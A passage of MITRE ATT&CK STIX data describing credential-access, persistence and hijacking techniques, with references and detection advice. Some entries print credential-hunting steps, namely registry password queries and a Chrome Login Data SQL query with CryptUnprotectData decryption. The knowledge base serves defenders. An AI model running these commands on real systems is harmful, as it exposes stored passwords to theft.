2018\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA18-086A\"}],\"id\":\"attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-29T20:35:36.694Z\",\"name\":\"Credential Stuffing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Diogo Fernandes\",\"Anastasios Pingios\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Office 365 account logs\"],\"x_mitre_detection\":\"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-04T12:52:13.006Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\\n\\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\\n\\nIn cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)\",\"external_references\":[{\"external_id\":\"T1552.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552/001\"},{\"external_id\":\"CAPEC-639\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/639.html\"},{\"description\":\"CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.\",\"source_name\":\"CG 2014\",\"url\":\"http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html\"},{\"description\":\"Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.\",\"source_name\":\"SRD GPP\",\"url\":\"http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx\"},{\"description\":\"Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019.\",\"source_name\":\"Specter Ops - Cloud Credential Storage\",\"url\":\"https://posts.specterops.io/head-in-the-clouds-bd038bb69e48\"}],\"id\":\"attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T18:30:10.630Z\",\"name\":\"Credentials In Files\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\"],\"x_mitre_detection\":\"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_system_requirements\":[\"Access to files\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:48:28.456Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.\",\"external_references\":[{\"external_id\":\"T1555\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1555\"}],\"id\":\"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T18:40:15.564Z\",\"name\":\"Credentials from Password Stores\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"PowerShell logs\",\"API monitoring\",\"File monitoring\",\"Process monitoring\",\"System calls\"],\"x_mitre_detection\":\"Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-06-17T19:34:51.855Z\",\"external_references\":[{\"external_id\":\"T1503\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1503\"},{\"description\":\"Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.\",\"source_name\":\"Talos Olympic Destroyer 2018\",\"url\":\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"},{\"description\":\"Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved June 18, 2019.\",\"source_name\":\"Microsoft CryptUnprotectData \u{200e}April 2018\",\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata\"},{\"description\":\"Proofpoint. (2018, May 10). New Vega Stealer shines brightly in targeted campaign . Retrieved June 18, 2019.\",\"source_name\":\"Proofpoint Vega Credential Stealer May 2018\",\"url\":\"https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign\"},{\"description\":\"Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18, 2019.\",\"source_name\":\"FireEye HawkEye Malware July 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html\"},{\"description\":\"Jamieson O\'Reilly (putterpanda). (2016, July 4). mimikittenz. Retrieved June 20, 2019.\",\"source_name\":\"GitHub Mimikittenz July 2016\",\"url\":\"https://github.com/putterpanda/mimikittenz\"}],\"id\":\"attack-pattern--4579d9c9-d5b9-45e0-9848-0104637b579f\",\"modified\":\"2020-02-12T18:57:58.395Z\",\"name\":\"Credentials from Web Browsers\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-12T18:57:36.041Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\\n\\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData \u{200e}April 2018)\\n \\nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\\n\\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\\n\\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary\'s objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).\",\"external_references\":[{\"external_id\":\"T1555.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1555/003\"},{\"description\":\"Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.\",\"source_name\":\"Talos Olympic Destroyer 2018\",\"url\":\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"},{\"description\":\"Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved June 18, 2019.\",\"source_name\":\"Microsoft CryptUnprotectData \u{200e}April 2018\",\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata\"},{\"description\":\"Proofpoint. (2018, May 10). New Vega Stealer shines brightly in targeted campaign . Retrieved June 18, 2019.\",\"source_name\":\"Proofpoint Vega Credential Stealer May 2018\",\"url\":\"https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign\"},{\"description\":\"Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18, 2019.\",\"source_name\":\"FireEye HawkEye Malware July 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html\"},{\"description\":\"Jamieson O\'Reilly (putterpanda). (2016, July 4). mimikittenz. Retrieved June 20, 2019.\",\"source_name\":\"GitHub Mimikittenz July 2016\",\"url\":\"https://github.com/putterpanda/mimikittenz\"}],\"id\":\"attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-02-17T13:20:02.386Z\",\"name\":\"Credentials from Web Browsers\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ryan Benson, Exabeam\",\"Barry Shteiman, Exabeam\",\"Sylvain Gil, Exabeam\",\"RedHuntLabs, @redhuntlabs\"],\"x_mitre_data_sources\":[\"File monitoring\",\"API monitoring\",\"PowerShell logs\",\"Process monitoring\"],\"x_mitre_detection\":\"Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:02.188Z\",\"external_references\":[{\"external_id\":\"T1081\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1081\"},{\"external_id\":\"CAPEC-639\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/639.html\"},{\"description\":\"CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.\",\"source_name\":\"CG 2014\",\"url\":\"http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html\"},{\"description\":\"Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.\",\"source_name\":\"SRD GPP\",\"url\":\"http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx\"},{\"description\":\"Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019.\",\"source_name\":\"Specter Ops - Cloud Credential Storage\",\"url\":\"https://posts.specterops.io/head-in-the-clouds-bd038bb69e48\"}],\"id\":\"attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c\",\"modified\":\"2020-02-04T12:55:03.678Z\",\"name\":\"Credentials in Files\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1214\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1214\"},{\"description\":\"netbiosX. (2017, April 19). Stored Credentials. Retrieved April 6, 2018.\",\"source_name\":\"Pentestlab Stored Credentials\",\"url\":\"https://pentestlab.blog/2017/04/19/stored-credentials/\"}],\"id\":\"attack-pattern--2edd9d6a-5674-4326-a600-ba56de467286\",\"modified\":\"2020-02-04T12:59:37.464Z\",\"name\":\"Credentials in Registry\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-04T12:58:40.678Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\\n\\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\\n\\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>\",\"external_references\":[{\"external_id\":\"T1552.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552/002\"},{\"description\":\"netbiosX. (2017, April 19). Stored Credentials. Retrieved April 6, 2018.\",\"source_name\":\"Pentestlab Stored Credentials\",\"url\":\"https://pentestlab.blog/2017/04/19/stored-credentials/\"}],\"id\":\"attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-02-07T20:49:18.834Z\",\"name\":\"Credentials in Registry\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Sudhanshu Chauhan, @Sudhanshu_C\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Ability to query some Registry locations depends on the adversary\'s level of access. User permissions are usually limited to access of user-related Registry keys.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-12-03T14:25:00.538Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\\n\\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <code>cron</code> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\",\"external_references\":[{\"external_id\":\"T1053.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1053/003\"}],\"id\":\"attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-23T23:30:46.546Z\",\"name\":\"Cron\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \\n\\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_remote_support\":false,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:10.314Z\",\"external_references\":[{\"external_id\":\"T1094\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1094\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00\",\"modified\":\"2020-03-20T19:03:04.295Z\",\"name\":\"Custom Command and Control Protocol\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-05-31T21:30:31.197Z\",\"external_references\":[{\"external_id\":\"T1024\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1024\"},{\"description\":\"F-Secure Labs. (2014, July). COSMICDUKE Cosmu with a twist of MiniDuke. Retrieved July 3, 2014.\",\"source_name\":\"F-Secure Cosmicduke\",\"url\":\"https://www.f-secure.com/documents/996508/1030745/cosmicduke_whitepaper.pdf\"},{\"description\":\"Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.\",\"source_name\":\"Fidelis DarkComet\",\"url\":\"https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d\",\"modified\":\"2020-03-30T20:17:22.024Z\",\"name\":\"Custom Cryptographic Protocol\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T18:45:34.293Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller\'s application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\\n\\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account\'s password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\\n\\nDCSync functionality has been included in the \\\"lsadump\\\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)\",\"external_references\":[{\"external_id\":\"T1003.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/006\"},{\"description\":\"Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.\",\"source_name\":\"Microsoft DRSR Dec 2017\",\"url\":\"https://msdn.microsoft.com/library/cc228086.aspx\"},{\"description\":\"Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.\",\"source_name\":\"Microsoft GetNCCChanges\",\"url\":\"https://msdn.microsoft.com/library/dd207691.aspx\"},{\"description\":\"SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.\",\"source_name\":\"Samba DRSUAPI\",\"url\":\"https://wiki.samba.org/index.php/DRSUAPI\"},{\"description\":\"Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.\",\"source_name\":\"Wine API samlib.dll\",\"url\":\"https://source.winehq.org/WineAPI/samlib.html\"},{\"description\":\"Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.\",\"source_name\":\"ADSecurity Mimikatz DCSync\",\"url\":\"https://adsecurity.org/?p=1729\"},{\"description\":\"Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017.\",\"source_name\":\"Harmj0y Mimikatz and DCSync\",\"url\":\"http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/\"},{\"description\":\"Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.\",\"source_name\":\"InsiderThreat ChangeNTLM July 2017\",\"url\":\"https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM\"},{\"description\":\"Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.\",\"source_name\":\"GitHub Mimikatz lsadump Module\",\"url\":\"https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump\"},{\"description\":\"Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.\",\"source_name\":\"Microsoft NRPC Dec 2017\",\"url\":\"https://msdn.microsoft.com/library/cc237008.aspx\"},{\"description\":\"Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.\",\"source_name\":\"Microsoft SAMR\",\"url\":\"https://msdn.microsoft.com/library/cc245496.aspx\"},{\"description\":\"Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.\",\"source_name\":\"AdSecurity DCSync Sept 2015\",\"url\":\"https://adsecurity.org/?p=1729\"},{\"description\":\"Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.\",\"source_name\":\"Harmj0y DCSync Sept 2015\",\"url\":\"http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/\"}],\"id\":\"attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:46:23.547Z\",\"name\":\"DCSync\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Vincent Le Toux\"],\"x_mitre_data_sources\":[\"Windows event logs\"],\"x_mitre_detection\":\"Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\\n\\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:40.604Z\",\"external_references\":[{\"external_id\":\"T1038\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1038\"},{\"external_id\":\"CAPEC-471\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/471.html\"},{\"description\":\"Microsoft. (n.d.). Dynamic-Link Library Search Order. Retrieved November 30, 2014.\",\"source_name\":\"Microsoft DLL Search\",\"url\":\"http://msdn.microsoft.com/en-US/library/ms682586\"},{\"description\":\"OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.\",\"source_name\":\"OWASP Binary Planting\",\"url\":\"https://www.owasp.org/index.php/Binary_planting\"},{\"description\":\"Microsoft. (2010, August 22). Microsoft Security Advisory 2269637 Released. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft 2269637\",\"url\":\"https://msrc-blog.microsoft.com/2010/08/21/microsoft-security-advisory-2269637-released/\"},{\"description\":\"Microsoft. (n.d.). Dynamic-Link Library Redirection. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft DLL Redirection\",\"url\":\"http://msdn.microsoft.com/en-US/library/ms682600\"},{\"description\":\"Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft Manifests\",\"url\":\"https://msdn.microsoft.com/en-US/library/aa375365\"},{\"description\":\"Mandiant. (2010, August 31). DLL Search Order Hijacking Revisited. Retrieved December 5, 2014.\",\"source_name\":\"Mandiant Search Order\",\"url\":\"https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/\"}],\"id\":\"attack-pattern--46944654-fcc1-4f63-9dad-628102376586\",\"modified\":\"2020-03-26T14:49:47.091Z\",\"name\":\"DLL Search Order Hijacking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-13T18:11:08.357Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\\n\\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\\n\\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL. (Citation: Microsoft Dynamic-Link Library Redirection) (Citation: Microsoft Manifests) (Citation: FireEye DLL Search Order Hijacking)\\n\\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.\",\"external_references\":[{\"external_id\":\"T1574.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/001\"},{\"external_id\":\"CAPEC-471\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/471.html\"},{\"description\":\"Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.\",\"source_name\":\"Microsoft Dynamic Link Library Search Order\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN\"},{\"description\":\"OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.\",\"source_name\":\"OWASP Binary Planting\",\"url\":\"https://www.owasp.org/index.php/Binary_planting\"},{\"description\":\"Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.\",\"source_name\":\"Microsoft Security Advisory 2269637\",\"url\":\"https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637\"},{\"description\":\"Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.\",\"source_name\":\"Microsoft Dynamic-Link Library 